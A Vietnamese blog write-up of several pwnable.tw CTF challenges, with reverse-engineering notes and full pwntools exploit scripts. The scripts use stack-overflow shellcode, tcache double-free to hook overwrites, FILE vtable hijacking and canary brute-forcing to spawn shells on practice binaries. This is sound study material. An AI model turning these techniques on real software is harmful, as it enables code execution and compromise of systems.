--- 
title: Pwnable.tw 
date: 2025-03-06 00:00:00 +0800
categories: [writeup]
tags: [pwn]
author: "kuvee"
layout: post
---


## start

checksec : 
![image](/assets/images/Pwnable.tw/1.png)

REVERSE
- 1 chương trình toàn mã ASM , ta chỉ cần chú ý 2 chỗ quan trọng ```int 0x80``` , opcode này sẽ tương tự syscall trong 64 bit , ta thấy từ đoạn push ```3A465443h``` trở đi nó setup để gọi ```int 0x80``` đầu tiên , lúc này ```al``` = 4 , ```bl``` = 1 , ```dl``` = 0x14 và đến lệnh ```int 0x80``` và nó sẽ là syscall write 

![image](/assets/images/Pwnable.tw/2.png)

- tương tự với ```int 0x80``` thứ hai , nó sẽ là syscall ```read``` , ta thấy nó read ```0x3C``` và trước lệnh ```ret``` nó tăng esp lên 0x14 , có nghĩa là tràn ```0x3c-0x14``` và chương trình không có bất kỳ biện pháp bảo vệ nào 
![image](/assets/images/Pwnable.tw/3.png)

EXPLOIT 

cách đơn giản nhất ở đây có lẽ là dùng shellcode ```execve``` , tuy nhiên ta chưa biết địa chỉ chứa shellcode của ta? , ta sẽ dùng syscall write để leak nó trước xong rồi mới thực hiện ```ret2shellcode```


trước lệnh ret nó sẽ tăng esp lên cho ta , vậy ta sẽ overwrite ```RIP``` đến đoạn ``` mov     ecx, esp```  , khi có địa chỉ leak thì tính toán địa chỉ stack chứa shellcode và overwrite ```RIP``` bằng địa chỉ đó là xong

>cần chú ý 1 điều ở đây là ta chỉ có ```0x3c - 0x14 + 4 byte của địa chỉ chứa shellcode``` nên cần setup shellcode sao cho ít byte nhất có thể 
![image](/assets/images/Pwnable.tw/4.png)

script : 

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./start',checksec=False)
context.arch = 'i386'
p = process()


#shellcode2 = asm('''
#                 xor eax,eax
#                 push eax
#                 push 0x68732f2f
#                 push 0x6e69622f
#                 mov esp,ebx
#                 mov eax,ecx
#                 mov eax,edx
#                 mov 0xb,al
#                 int 0x80
#                 xor eax,eax
#                 inc eax
#                 int 0x80
#                 ''')
shellcode =  b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = b'a'*20 + p32(0x08048087)
input()
p.sendafter(b"Let's start the CTF:",payload)
leak = u32(p.recv(4))
target = leak + 20
log.info(f'target: {hex(target)}')
input()
payload2 = b'a'*0x14 + p32(target) + shellcode
print(len(payload2))
p.send(payload2)

p.interactive()
```

-------------------

## orw

- vừa nhìn vào là biến đây sẽ là 1 bài ```shellcode``` , ở đây ta được nhập vào shellcode với lenght là ```0xc8```


```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, &shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}
```

orw_seccomp : ở hàm này nó sẽ filter syscall của ta bằng ```seccomp```  , nói đơn giản về ```seccomp``` (chế độ tính toán an toàn) là một cơ chế bảo vệ cho phép bạn giới hạn các lệnh gọi hệ thống mà một quy trình có thể phát ra.



```c
unsigned int orw_seccomp()
{
  __int16 v1; // [esp+4h] [ebp-84h] BYREF
  char *v2; // [esp+8h] [ebp-80h]
  char v3[96]; // [esp+Ch] [ebp-7Ch] BYREF
  unsigned int v4; // [esp+6Ch] [ebp-1Ch]

  v4 = __readgsdword(0x14u);
  qmemcpy(v3, &unk_8048640, sizeof(v3));
  v1 = 12;
  v2 = v3;
  prctl(38, 1, 0, 0, 0);
  prctl(22, 2, &v1);
  return __readgsdword(0x14u) ^ v4;
}
```

- ta có thể dùng ```seccomp-tools``` để check : vậy bài này chỉ được dùng các syscall : open , read , write

![image](/assets/images/Pwnable.tw/5.png)


xem các syscall cần setup : https://syscalls.mebeim.net/?table=x86/32/ia32/latest

- ```open(eax,ebx,ecx,edx)``` : eax là syscall , ebx sẽ trỏ đến địa chỉ chứa đường dẫn , ecx là flag , edx là mode , ở đây ecx và edx là NULL là được

- read(eax,ebx,ecx,edx) :  ebx , ecx , edx tương đương với (fd,buf,count) và eax là 3
- write(eax,ebx,ecx,edx) : eax là 4 ebx,ecx,edx tương tự ```read```

- chú ý là đường dẫn phải theo little edian nên ta dùng p32(..) cho dễ

![image](/assets/images/Pwnable.tw/6.png)

script : có thể dùng ```ppwntool``` cũng được
```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./orw',checksec=False)
context.arch = 'i386'
#p = process()
p = remote('chall.pwnable.tw', 10001)

#gdb.attach(p,gdbscript='''
#           b*0x0804858A
#           b*0x0804857D
#           ''')
shellcode = asm('''
                xor ecx,ecx
                xor edx,edx
                push ecx
                push 0x67616c66
                push 0x2f2f7772
                push 0x6f2f2f65
                push 0x6d6f682f
                mov ebx,esp
                mov eax,5
                int 0x80

                mov ebx, eax
                mov ecx, esp
                mov edx, 0x30
                mov eax, 0x3
                int 0x80


                mov ebx, 0x1
                mov eax, 0x4
                int 0x80
                ''')
sc = asm(
    shellcraft.i386.linux.open(b'/home/orw/flag') +
    shellcraft.i386.linux.read('eax', 'esp', 50) +
    shellcraft.i386.linux.write('1', 'esp', 50)
)
input()
p.sendafter(b'Give my your shellcode:',shellcode)

p.interactive()
```

![image](/assets/images/Pwnable.tw/7.png)



ref : https://kashiwaba-yuki.com/ctf-pwn-gachi-rop#seccomp-%E3%81%AE%E6%A6%82%E8%A6%81%E3%81%A8%E5%AE%9F%E8%A3%85


-------------



## tcache tear


checksec: 

PIE tắt , FULL RELRO -> không ghi vào GOT được
![image](/assets/images/Pwnable.tw/8.png)

REVERSE


sau khi rename lại các function thì nó sẽ như thế này , đầu tiên ```read``` 32 byte vào ```bss``` 
![image](/assets/images/Pwnable.tw/9.png)

- option1 : 

được nhập 1 size và malloc với size đó , ở đây size phải thõa <= 0xFF , sau đó read vào chunk với số byte là ```size-16``` 
![image](/assets/images/Pwnable.tw/10.png)

- option2 : 

```free(ptr)``` tối đa có thể ```free``` 8 chunk , và bug ```UAF``` sẽ xuất hiện ở đây 

![image](/assets/images/Pwnable.tw/11.png)

- option3 : 

in dữ liệu của ```bss``` 
![image](/assets/images/Pwnable.tw/12.png)


EXPLOIT 

- phiên bản libc của bài này là 2.27 -> vẫn có thể dùng hook để lấy shell ( FULL RELRO nên không overwrite GOT được ) , muốn overwrite HOOK thì phải leak libc  ,vậy ta cần suy nghĩ cách leak libc trước

- vì ta có bug ```uaf``` và ```double free``` , nếu ta free cùng 1 chunk vào tcache 2 lần nó cũng sẽ không xảy ra lỗi và khi malloc lại ta có thể ghi đè ```fd``` , lần fd thứ hai sẽ giúp ta ghi dữ liệu tùy ý vào địa chỉ ở lần malloc thứ nhất

- trước tiên cần setup các hàm để tiện khai thác và thử cái ta đã nói : 



```
def malloc(size,data):
    p.sendlineafter(b'Your choice :',b'1')
    p.sendlineafter(b'Size:',f'{size}'.encode())
    p.sendafter(b'Data:',data)
def free():
    p.sendlineafter(b'Your choice :',b'2')

def show():
    p.sendlineafter(b'Your choice :',b'3')

p.sendafter(b'Name:',b'aaaa')
bss = 0x0000000000602060

input()
malloc(0x20,b'a')
malloc(0x20,b'a')

free()
free()

malloc(0x20,p64(bss))
malloc(0x20,b'kakakakaka')
p.interactive()
```

- ta thấy ```fd``` sẽ trỏ đến nhau vì bây giờ 2 thằng giống nhau
![image](/assets/images/Pwnable.tw/13.png)

- lúc này tcache chứa bss và ta có thể ghi vào chunk này , có nghĩa là ta có thể tận dụng ```vuln``` này để ghi bất kì vào địa chỉ nào như ```GOT``` or ```HOOK``` 
![image](/assets/images/Pwnable.tw/14.png)

- muốn leak được libc thì cách đơn giản nhất là ta sẽ free() chunk đó vào ```unsorted bin```  , Theo mặc định, số lượng danh sách liên kết đơn trong tcache là 64 và kích thước khối bộ nhớ tối đa có thể chứa ở chế độ 64 bit là 1032 (0x408), vì vậy ta có thể malloc 1 size lớn hơn size đó và nó sẽ đi vào ```unsorted bin``` , tuy nhiên thì bài này giới hạn size nên không thể làm cách đó 
- 1 cách khác là ta có thể ```free``` 7 chunk để filter đầy tcache , lúc này khi ```free``` chunk thứ 8 nó cũng vào ```unsorted bin``` , và tất nhiên bài này cũng đã không cho phép làm điều này 


- tuy nhiên nếu thõa mãn 2 cách trên và free vào được ```unsorted bin``` , lúc này cũng không có hàm nào để in dữ liệu cho ta , hàm in duy nhất mà bài này có là in dữ liệu của ```bss```
- vậy ở đây ta sẽ leak libc như sau :


> ta có thể fake 1 chunk có size lớn hơn tcache ở 1 địa chỉ nào đó , sau đó giải phóng nó và nó sẽ vào unsorted bin cuối cùng là sử dụng hàm đọc để đọc dữ liệu ,ở đây hàm đọc sẽ đọc dữ liệu của bss nên ta sẽ fake chunk ở bss 

> tuy nhiên sẽ có 1 số điều đáng lưu ý ở đây , đầu tiên ngoài làm cho size lớn hơn 0x408 , ta cũng phải đáp ứng được định dạng khối heap cơ bản và phải có ít nhất 2 khối . bởi vì sẽ có hàng loạt kiểm tra được thực hiện trên các khối heap tiếp theo và khối heap hiện tại


```
// 在 _int_free 函数中
if (nextchunk != av->top) {
  /* get and clear inuse bit */
  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
```

ta có thể thấy hàm free cũng kiểm tra next_chunk của chunk hiện tại và cũng kiểm tra ``` inuse bit``` của next chunk . vì vậy ở đây ta sẽ fake 3 chunk heap như sau : 

```
                        bss

name  +------------> +--------+ +------------+
                     |   0    |
                     +--------+
                     |  0x501 |
ptr   +------------> +--------+
                     |        |
free(ptr);           |        |
                     |        |  fake chunk 1
                     |        |
                     |        |
                     |        |
                     |        |
                     |        |
                     |        |
name + 0x500  +----> +--------+ +------------+
                     |   0    |
                     +--------+
                     |  0x21  |
                     +--------+  fake chunk 2
                     |   0    |
                     +--------+
                     |   0    |
                     +--------+ +------------+
                     |   0    |
                     +--------+
                     |  0x21  |
                     +--------+  fake chunk 3
                     |   0    |
                     +--------+
                     |   0    |
                     +--------+ +------------+
```

vậy script của ta sẽ như sau : 

```
def malloc(size,data):
    p.sendlineafter(b'Your choice :',b'1')
    p.sendlineafter(b'Size:',f'{size}'.encode())
    p.sendafter(b'Data:',data)
def free():
    p.sendlineafter(b'Your choice :',b'2')

def show():
    p.sendlineafter(b'Your choice :',b'3')

bss = 0x0000000000602060

input()

#fake chunk
p.sendafter(b'Name:',p64(0) + p64(0x501))

malloc(0x50,b'a')

# double free
free()
free()
# overwrite fd 
malloc(0x50,b'a')
#FAKE CHUNK again
malloc(0x50,(p64(0) + p64(0x21) + p64(0) + p64(0))*2)

# khởi tạo lại để biến ptr thành bss+0x10
malloc(0x60,b'a')
free()
free()
malloc(0x60,p64(bss+0x10))
malloc(0x60,b'a')
malloc(0x60,b'a')
free()
```

- và lúc này khi free()fake chunk 0x500 thì nó sẽ đi vào ```unsorted``` và ta có địa chỉ libc

![image](/assets/images/Pwnable.tw/15.png)

- lúc này ta cần tính toán địa chỉ base của libc , sau đó có thể overwrite ```__free_hook``` hoặc ```__malloc_hook``` , ở đây mình chọn ```free_hook```

![image](/assets/images/Pwnable.tw/16.png)

- overwrite _hook : tiếp tục tận dụng ```double free``` để ghi ```system``` vào ```__free_hook```  , và lúc này con trỏ ```ptr``` của ta sẽ là địa chỉ của ```free_hook```  , ta cần malloc lại để tạo ```ptr``` mới và ghi ```/bin/sh``` vào chunk đó và tiến hành free() , 1 cách dễ dàng hơn là dùng ```one_gadget```
```
malloc(0x70,b'a')
free()
free()
malloc(0x70,p64(libc.sym.__free_hook))
malloc(0x70,b'a')
malloc(0x70,p64(libc.sym.system))
```


script : 


```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_tear_patched")
libc = ELF("./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
#p = process()
p = remote('chall.pwnable.tw', 10207)
#gdb.attach(p,gdbscript='''
#           b*0x0000000000400B54
#           b*0x0000000000400A25
#           b*0x0000000000400C54
#           b*0x0000000000400BBF
#           ''')

def malloc(size,data):
    p.sendlineafter(b'Your choice :',b'1')
    p.sendlineafter(b'Size:',f'{size}'.encode())
    p.sendafter(b'Data:',data)
def free():
    p.sendlineafter(b'Your choice :',b'2')

def show():
    p.sendlineafter(b'Your choice :',b'3')

bss = 0x0000000000602060

###  FAKE CHUNK ###
p.sendafter(b'Name:',p64(0) + p64(0x501))

malloc(0x50,b'a')

### DOUBLE FREE ###
free()
free()

### OVER WRITE FD ###
malloc(0x50,p64(bss+0x500))

malloc(0x50,b'a')

### FAKE 2 CHUNK TIEP THEO ###
malloc(0x50,(p64(0) + p64(0x21) + p64(0) + p64(0))*2)

### CHANGE PTR TO LEAK ###
malloc(0x60,b'a')
free()
free()
malloc(0x60,p64(bss+0x10))
malloc(0x60,b'a')
malloc(0x60,b'a')
free()

# leak success
show()
p.recvuntil(b'Name :')
p.recv(16)
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x3ebca0
log.success(f'libc address: {hex(libc.address)}')

input()
# OVER WRITE HOOK
malloc(0x70,b'a')
free()
free()
malloc(0x70,p64(libc.sym.__free_hook))
malloc(0x70,b'a')
malloc(0x70,p64(libc.sym.system))

# CHANGE PTR TO GET SHELL
malloc(0x70,b'a')
malloc(0x70,b'/bin/sh\x00')
free()



p.interactive()
```
![image](/assets/images/Pwnable.tw/17.png)


ref : https://www.theflash2k.me/blog/writeups/pwnable.tw/tcache_tear


## re-alloc


checksec : 
![image](/assets/images/Pwnable.tw/18.png)


- chương trình sẽ có 3 option chính :

![image](/assets/images/Pwnable.tw/19.png)

allocate:

ở đây nó giới hạn ta chỉ được nhập 2 idx và size <= 0x78(tcache) , tiếp theo nó dùng ```realloc``` để phân bổ và nhập dữ liệu vào 
![image](/assets/images/Pwnable.tw/20.png)

ta sẽ thử tìm hiểu xem realloc sẽ khác gì so với malloc : 

- realloc(ptr, NULL): sẽ tương tự với free(ptr)
- realloc(ptr, size): mở rộng/thu nhỏ đoạn bộ nhớ dựa trên kích thước được yêu cầu. Nếu giá trị kích thước giống với kích thước khối cũ thì không có gì được thực hiện và khối bộ nhớ tương tự sẽ được trả về.

- realloc(NULL, size) : giống như malloc(size)


rfree() :

dùng realloc(ptr, NULL) để giải phóng chunk này và gán NULL -> không có UAF

![image](/assets/images/Pwnable.tw/21.png)

reallocate : 

hàm này giống với tên bài nên khả năng cần khai thác ở đây , ta cũng được nhập ```idx``` , ```size``` các kiểu vào , như đã đề cập nếu ta nhập size bằng với size chunk hiện tại thì không thực hiện gì và khối bộ nhớ tương tự sẽ trả về , nếu ta nhập size là 0 thì sẽ tương tự free() và free() ở đây sẽ xảy ra UAF 

làm những bài heap thì libc sẽ là cần thiết , tuy nhiên ở đây không có hàm show hay gì khác , ta cần suy nghĩ cách để leak nó ra
![image](/assets/images/Pwnable.tw/22.png)

-----

## seethefile

checksec : đây sẽ là 1 file 32bit

![image](/assets/images/Pwnable.tw/23.png)

### REVERSE 

- bài này sẽ có 5 ```option``` 

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char nptr[32]; // [esp+Ch] [ebp-2Ch] BYREF
  unsigned int v5; // [esp+2Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  init();
  welcome();
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%s", nptr);
    switch ( atoi(nptr) )
    {
      case 1:
        openfile();
        break;
      case 2:
        readfile();
        break;
      case 3:
        writefile();
        break;
      case 4:
        closefile();
        break;
      case 5:
        printf("Leave your name :");
        __isoc99_scanf("%s", name);
        printf("Thank you %s ,see you next time\n", name);
        if ( fp )
          fclose(fp);
        exit(0);
        return result;
      default:
        puts("Invaild choice");
        exit(0);
        return result;
    }
  }
}
```

- **OPEN** : ở đây nó sẽ check ```fp``` trước , nếu fp thõa thì ta có thể input 63 byte , ở đây nó sẽ check trong ```input``` có chứa chuỗi flag không , nếu có thì sẽ không thõa 

```c
int openfile()
{
  if ( fp )
  {
    puts("You need to close the file first");
    return 0;
  }
  else
  {
    memset(magicbuf, 0, 0x190u);
    printf("What do you want to see :");
    __isoc99_scanf("%63s", filename);
    if ( strstr(filename, "flag") )
    {
      puts("Danger !");
      exit(0);
    }
    fp = fopen(filename, "r");
    if ( fp )
      return puts("Open Successful");
    else
      return puts("Open failed");
  }
}
```

- **READFILE** : tiếp tục check ```fp``` , đọc ```0x18``` byte từ fp vào ```magicbuf```

```c
size_t readfile()
{
  size_t result; // eax

  memset(magicbuf, 0, 0x190u);
  if ( !fp )
    return puts("You need to open a file first");
  result = fread(magicbuf, 0x18Fu, 1u, fp);
  if ( result )
    return puts("Read Successful");
  return result;
}
```

- **WRITEFILE** : check chuỗi ```flag``` có trong filename , magicbuf không và nó check luôn kí tự '}'

```c
int writefile()
{
  if ( strstr(filename, "flag") || strstr(magicbuf, "FLAG") || strchr(magicbuf, 125) )
  {
    puts("you can't see it");
    exit(1);
  }
  return puts(magicbuf);
}
```

- **CLOSEFILE** : hàm này đơn giản là đóng tệp 

```c
int closefile()
{
  int result; // eax

  if ( fp )
    result = fclose(fp);
  else
    result = puts("Nothing need to close");
  fp = 0;
  return result;
}
```

- option5 : ta thấy ở option này sẽ xảy ra ```BOF``` , với biến ```name``` là 1 biến nằm ở vùng ```bss``` , ta có thể overwrite được ```fp```

![image](/assets/images/Pwnable.tw/24.png)


```c
case 5:
        printf("Leave your name :");
        __isoc99_scanf("%s", name);
        printf("Thank you %s ,see you next time\n", name);
        if ( fp )
          fclose(fp);
        exit(0);
        return result;
```

### EXPLOIT

- vì bài này overflow được ```fp``` nên mình nghĩ ngay đến ```FSOP``` , overwrite ```vtable``` để lấy shell các kiểu :)) , tuy nhiên trước hết ta cần leak libc trước 
- vì ở đây ta được mở 1 file đọc dữ liệu và in nó ra -> ta có thể dùng ```/proc/seft/maps``` nó sẽ là danh sách các vùng bộ nhớ đã được tải của quá trình đọc 

![image](/assets/images/Pwnable.tw/25.png)

- ta có thể đọc 2 lần và nó sẽ in địa chỉ libc cho ta

![image](/assets/images/Pwnable.tw/26.png)

- tiếp theo ta sẽ cần tìm hiểu cách tấn công ```FSOP``` để lấy shell , vì phiên bản libc khá cổ đại (2.23) và nó sẽ không check vtable nên ta có thể ghi đè vtable trỏ đến system thay vì làm gì đó 

- ta có thể xem source code libc ở đây : https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libio.h#L241


xem bài viết này để hiểu hơn : https://nightrainy.github.io/2019/08/07/play-withe-file-structure-%E6%90%AC%E8%BF%90/#fclose-workflow

![image](/assets/images/Pwnable.tw/27.png)

script
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./seethefile_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe

p = process()

def open_(data):
    p.sendlineafter(b'choice :',b'1')
    p.sendlineafter(b'see :',data)

def read():
    p.sendlineafter(b'choice :',b'2')

def write():
    p.sendlineafter(b'choice :',b'3')

open_(b'/proc/self/maps')
read()
read()
write()

p.recvuntil(b'[heap]')
p.recvline()
libc.address = int(b'0x' + p.recv(8),16)
log.info(f'leak: {hex(libc.address)}')
p.recvlines(2)


file = FileStructure()
file.flags = u32(b'/bin')           # th nay se la doi so khi goi system
file._IO_read_ptr = u32(b'/sh\x00')         # Add this line
file._lock = 0x804ba00
file.vtable = 0x804b284 - 0x44  # call [eax+0x44]  -> - 0x44
payload = flat(
    b'A'*0x20,
    0x804b290, libc.sym['system'], 0, 0,
    bytes(file)
    )
input()
p.sendlineafter(b'choice :', b'5')
p.sendlineafter(b'name :', payload)
p.interactive()
```


### ta sẽ cùng phân tích để hiểu sâu hơn : 

Khi chúng ta sử dụng fopen để mở một tệp, một vùng bộ nhớ sẽ được phân bổ trên heap để lưu trữ cấu trúc FILE . phần đầu sẽ là   ```_IO_FILE``` và phần sau là 1 con trỏ đến ```struct IO_jump_t``` , cấu trúc này lưu các con trỏ hàm liên quan đến IO_FILE  . Khi chúng ta gọi fclose để đóng một tập tin, cuối cùng chúng ta sẽ gọi con trỏ hàm được lưu trong vtable. Nếu chúng ta có thể thay thế con trỏ trong vtable bằng địa chỉ mà chúng ta muốn chuyển tới, chúng ta có thể chiếm quyền điều khiển luồng chương trình.

điều kiện : 


- Chỉ xem xét các trường hợp phiên bản libc <= 2.23. Bởi vì libc lớn hơn hoặc bằng 2,24 sẽ phán đoán vị trí của vtable và không thể làm cho nó trỏ tới khu vực do chính nó xây dựng.
- Bạn có thể kiểm soát vị trí được trỏ bởi con trỏ vtable hoặc con trỏ fp
- Có một vùng bộ nhớ có thể điều khiển được với địa chỉ đã biết, kích thước tùy thuộc vào tình huống

Cách sử dụng 1: Ghi đè trực tiếp con trỏ vtable

- Nghĩa là, trỏ con trỏ vtable vào bộ nhớ có thể điều khiển và xây dựng __finish(off=2*SIZE_T) làm địa chỉ sẽ được thực thi.

Cách 2 : ghi đè fp

Đôi khi chúng ta không thể điều khiển trực tiếp con trỏ vtable của cấu trúc FILE, nhưng chúng ta có thể điều khiển con trỏ cấu trúc tệp FILE. Do đó, chúng ta cần giả mạo toàn bộ cấu trúc FILE, sau đó điều khiển con trỏ vtable để trỏ đến danh sách hàm do chúng ta tự xây dựng, sắp xếp địa chỉ mà chúng ta muốn gọi tại vị trí __finish(off=2*SIZE_T) và cuối cùng gọi fclose.

Chìa khóa của phương pháp này là tạo ra cấu trúc FILE phù hợp để không có ngoại lệ nào được kích hoạt trong quá trình fclose và khiến chương trình chấm dứt một cách bất thường.

Để tránh tình trạng này, một trong những cách đơn giản nhất là đặt vị trí cờ ```_IO_IS_FILEBUF``` của biến _flags của cấu trúc FILE về 0. Ví dụ: đặt nó thành ```0xffffdfff.``` Lý do chính để làm điều này là để bỏ qua một số hoạt động.

```c
if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);

  _IO_acquire_lock (fp);
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    status = _IO_file_close_it (fp);
  else
    status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;
  _IO_release_lock (fp);
  _IO_FINISH (fp);
```

- Có thể thấy khi bit ```_IO_IS_FILEBUF``` bằng 0 thì hàm không thực thi hàm ```_IO_un_link``` và ```_IO_file_close_it``` mà thực thi trực tiếp hàm ```_IO_FINISH```. Trong hàm _IO_FINISH, hàm __finish trong vtable được gọi trực tiếp. Trong đó _IO_IS_FILEBUF được xác định là 0x2000.

```c
#define _IO_IS_FILEBUF 0x2000
```

KẾT LUẬN : 

 
Kích thước của cấu trúc ```_IO_FILE``` ở đây là 0x94

Bảng ảo vtable chứa nhiều con trỏ, thường là 21 hoặc 23 biến mà chúng ta cần thay đổi là biến thứ ba và các biến khác có thể chứa địa chỉ bình thường.

script 2  : 


```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./seethefile_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe

p = process()

def open_(data):
    p.sendlineafter(b'choice :',b'1')
    p.sendlineafter(b'see :',data)

def read():
    p.sendlineafter(b'choice :',b'2')

def write():
    p.sendlineafter(b'choice :',b'3')

open_(b'/proc/self/maps')
read()
read()
write()

p.recvuntil(b'[heap]')
p.recvline()
libc.address = int(b'0x' + p.recv(8),16)
log.info(f'leak: {hex(libc.address)}')
p.recvlines(2)


fake_file_addr = 0x0804B300  # spare memory

payload = b'a' * 0x20 + p32(fake_file_addr)
payload += b'\x00' * (0x0804B300 - 0x0804B280 - 4)
# fake IO file struct  (size is 0x94)
# padding header with 0xFFFFDFFF and arg string
# the ||/bin/sh string is same as ;$0
payload += b'\xff\xff\xdf\xff;$0\x00'.ljust(0x94, b'\x00')
payload += p32(fake_file_addr + 0x98)
payload += p32(libc.sym.system) * 21

p.recvuntil('Your choice :')
p.sendline(b'5')
p.recvuntil('Leave your name :')
input()
p.sendline(payload)
p.interactive()
```


```Here is your flag: FLAG{F1l3_Str34m_is_4w3s0m3}```

ref :

https://www.jianshu.com/p/0176ebe02354

https://www.jianshu.com/p/a6354fa4dbdf

https://www.jianshu.com/p/2e00afb01606

https://hackmd.io/@kuvee/BypnRFkxye


-----------

## BabyStack 




checksec : 

![image](/assets/images/Pwnable.tw/29.png)


- ta thấy đầu tiên nó sẽ đọc giá trị random vào ```random``` và gán cho ```qword_202020``` , sẽ có 3 option chính ở bài này 
![image](/assets/images/Pwnable.tw/30.png)

- option 1 : 

check ```unk_202014``` , nếu ```unk_202014``` là 1 giá trị không NULL thì sẽ gán NULL , nếu không thì gọi hàm ```sub_DEF((const char *)random);```

![image](/assets/images/Pwnable.tw/31.png)

sub_DEF  : 

hàm này đơn giản là read 127 byte vào ```buf``` , sau đó nó dùng strlen() để tính độ dài của ```chuỗi``` , lưu ý strlen() sẽ dừng khi gặp byte null ta sẽ chú ý điều này , tiếp theo so sánh chuỗi random với chuỗi ta vừa nhập , nếu đúng thì gán ```unk_202014``` = 1
![image](/assets/images/Pwnable.tw/32.png)

- option 2 là end chương trình

- option 3 : check ```unk_202014``` có NULL không , nếu NULL thì in ```Invalid choice``` , nếu không thì gọi ```magic_copy```

```magic_coppy``` : read 63 byte vào ```src``` và coppy vào a1 , ở đây ta cũng cần chú ý strcpy sẽ dừng khi gặp byte null
![image](/assets/images/Pwnable.tw/33.png)


vì 1 số lí do IDA của mình không hiện đoạn này , check xem giá trị random có bằng với giá trị ban đầu không , nếu không thì gọi hàm ```__stack_chk_fail()``` , đây giống như 1 giá trị canary nhưng ở đây là nó được tạo bằng /dev/null chứ không phải được tạo khi biên dịch

![image](/assets/images/Pwnable.tw/34.png)

EXPLOIT 

- trước hết có lẽ là cần tìm cách vượt qua được giá trị random này , ta sẽ tận dụng bug ở hàm ```check``` để brute_force random_value , ở đây strlen(s) tính độ dài chuỗi ta nhập vào và strncmp() sẽ check từng byte với random_value , nó sẽ lấy v1 là length() của chuỗi ta nhập vào , vậy ta chỉ cần gửi số byte cần brute_force + với 1 byte null , cứ như vậy ta sẽ có random_value

![image](/assets/images/Pwnable.tw/35.png)

```
def bf():
    random_value = b''
    for i in range(16):
        p.sendafter(b'>>',b'1') #log out
        for j in range(1,256):
            p.sendafter(b'>> ',b'1')
            random_value += p8(j)
            p.sendafter(b'Your passowrd :',random_value + b'\x00')
            if b'Login Success' in p.recvline():
                break
            else:
                random_value = random_value[:-1]
    return random_value

passowrd = bf()
print(passowrd.hex())
#mở gdb lên check
gdb.attach(p)
input()
```

- tiếp theo , vì NX bật ở bài này nên có lẽ cách khả khi nhất là leak libc và dùng ```ROP``` , vì libc chứa nhiều các gadget hữu ích , quan trọng nhất là ```rdi``` , vậy ta sẽ leak thế nào?

đây là hàm có bug , ở đây ta thấy được nó sẽ dùng ```strcpy``` để coppy dữ liệu ta nhập vào qua a1 , tuy nhiên ```strcpy``` chỉ dừng khi gặp null byte , điều này có nghĩa là gì?  , có nghĩa là nếu ta nhập 1 dữ liệu nào đó mà kế nó là 1 địa chỉ thì nó sẽ coppy luôn sang v6 của hàm main và ghi đè random_value của ta , và ta chỉ cần brute_force lại random_value là ta sẽ có thứ ta cần 

![image](/assets/images/Pwnable.tw/36.png)

và a1 là v6 nằm trên giá trị random

![image](/assets/images/Pwnable.tw/37.png)

- tuy nhiên ở đây thêm 1 vấn đề phát sinh là ta chỉ có 63 kí tự input và nó sẽ không đủ để nối địa chỉ libc vào random_value , không biết vô tình hay cố ý nhưng nếu ta để ý kĩ thì 2 hàm này đều setup stack giống nhau , có nghĩa là sao?  điều đó có nghĩa là ta chỉ cần nhập dữ liệu bên hàm check_password sao cho overwrite các byteNULL mất , và khi dùng hàm strcpy ta sẽ có thể leak dữ liệu thành công


![image](/assets/images/Pwnable.tw/38.png)

![image](/assets/images/Pwnable.tw/39.png)


- hoàn tất việc leak libc và leak canary_random 


![image](/assets/images/Pwnable.tw/40.png)
- cuối cùng ta chỉ cần làm tương tự như việc leak libc , ta được nhập 127 byte ở hàm ```check``` , có nghĩa là tương đương với hàm coppy , vậy ta sẽ gửi : 

```
aaaaaaaa
aaaaaaaa
aaaaaaaa
aaaaaaaa
aaaaaaaa
aaaaaaaa
aaaaaaaa
aaaaaaaa
randomvalue
randomvalue
aaaaaaaa
aaaaaaaa
aaaaaaaa
system
```
![image](/assets/images/Pwnable.tw/41.png)


tóm tắt : tận dụng bug của các hàm ```strcpy``` ```strlen``` để brute_force canary và libc  -> overwrite ret_address = one_gadget



mất khá lâu để brute_force hết ề này
![image](/assets/images/Pwnable.tw/42.png)


```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./babystack_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


#p = process()
p = remote('chall.pwnable.tw', 10205)

#gdb.attach(p,gdbscript='''
#           brva 0x0000000000000E1E
 #          brva 0x0000000000000EBB
#           ''')
# login success
input()

def log_in():
    p.sendlineafter(b'>> ',b'1')
    p.sendafter(b'passowrd :',b'\x00')
def log_out():
    p.sendlineafter(b'>> ',b'1')

def bf():
    random_value = b''
    for i in range(16):
        p.sendlineafter(b'>>',b'1') #log out
        for j in range(1,256):
            p.sendlineafter(b'>>',b'1')
            random_value += p8(j)
            p.sendafter(b'Your passowrd :',random_value + b'\x00')
            if b'Login Success' in p.recvline():
                break
            else:
                random_value = random_value[:-1]
    return random_value
def bf_libc():
    libc_value = b''
    for i in range(14):
        p.sendlineafter(b'>>',b'1') #log out
        for j in range(1,256):
            p.sendlineafter(b'>>',b'1')
            libc_value += p8(j)
            p.sendafter(b'Your passowrd :',libc_value + b'\x00')
            if b'Login Success' in p.recvline():
                break
            else:
                libc_value = libc_value[:-1]
    return libc_value
log_in()
passowrd = bf()
